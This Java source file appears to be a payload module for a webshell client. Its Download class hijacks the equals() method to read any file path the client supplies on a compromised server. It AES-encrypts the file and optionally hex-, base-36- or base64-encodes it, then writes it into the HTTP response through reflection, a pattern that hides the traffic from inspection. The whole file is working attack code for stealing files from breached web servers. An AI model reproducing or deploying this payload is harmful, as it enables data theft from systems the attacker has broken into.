package org.b1ackc4t.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.util.*;

public class Download {
    public static String path;
    private Object res;
    public static String key;
    public static int encode;
    public boolean equals(Object obj) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Object o;
        Method m;
        try {
            fill(obj);
            bos.write("1@".getBytes());
            bos.write(download());
        } catch (Exception e) {
            try {
                bos.reset();
                bos.write("0@".getBytes());
            } catch (Exception r) {
            }
        }

        try {
            o = res.getClass().getMethod("getOutputStream").invoke(res);
            m = o.getClass().getMethod("write", byte[].class);
            byte[] r = encrypt(bos.toByteArray());
            bos.close();
            switch (encode) {
                case 0:
                    break;
                case 1:
                    r = new BigInteger(r).toString(16).getBytes();
                    break;
                case 2:
                    r = new BigInteger(r).toString(36).getBytes();
                    break;
                default:
                    if (System.getProperty("java.version").compareTo("1.8") >= 0) {
                        r = Base64.getEncoder().encode(r);
                    } else {
                        r = new sun.misc.BASE64Encoder().encode(r).getBytes();
                    }
            }
            m.invoke(o, r);
            o.getClass().getMethod("flush").invoke(o);
            o.getClass().getMethod("close").invoke(o);
//            Response.getOutputStream().write(this.Encrypt(bos.toByteArray()));
//            Response.getOutputStream().flush();
//            Response.getOutputStream().close();
        } catch (Exception e) {
        }
        return true;
    }

    private byte[] download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024 * 1024];
        int length;

        while((length = fis.read(buffer)) > 0) {
            bos.write(buffer, 0, length);
        }
        byte[] t = bos.toByteArray();
        bos.close();
        return t;
    }

    private byte[] encrypt(byte[] bs) throws Exception {
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(1, new SecretKeySpec(key.getBytes("utf-8"), "AES"));
        return c.doFinal(bs);
    }

    private void fill(Object obj) throws Exception {
        List<Object> p = (List)obj;
        res = p.get(0);
        if (p.size() > 1) {
            path = ((String) p.get(1));
        }
        res.getClass().getMethod("setCharacterEncoding", String.class).invoke(res, "UTF-8");
    }
}
